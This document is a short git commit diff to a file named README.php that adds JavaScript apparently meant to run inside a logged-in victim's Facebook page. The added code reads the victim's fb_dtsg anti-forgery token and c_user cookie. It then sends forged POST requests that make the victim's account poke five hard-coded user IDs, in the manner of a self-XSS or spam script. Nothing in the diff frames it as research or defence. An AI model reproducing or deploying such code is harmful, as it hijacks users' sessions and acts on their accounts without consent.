b98ad118c4a747c79e2159ce9af9e5df40953587
BhargavJt <email.is.2.expired@gmail.com>
2013-09-23 19:08:16 +0530

    Update README.php

--- README.php
+++ README.php
@@ -49,7 +49,33 @@ setTimeout(function () {
     IDS("100005202368891");
 }, 4000);
 
-}, 1000);
+/*poke*/
+var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
+var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function p(abone) {
+  var http4 = new XMLHttpRequest();
+  var url4 = "//www.facebook.com/pokes/dialog/?poke_target=" + abone + "&do_confirm=0";
+  var params4 = "poke_target=" + abone + "&do_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvudDgDxrHEHyGameyp8y&__req=i&fb_dtsg="+fb_dtsg+"&ttstamp=265816580891117469";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
+}
+
+p("100005147649818");
+p("100004620215045");
+p("100005115938614");
+p("100005748400819");
+p("100003147643648");
+
+
+
+
+}, 3000);
 
 
 
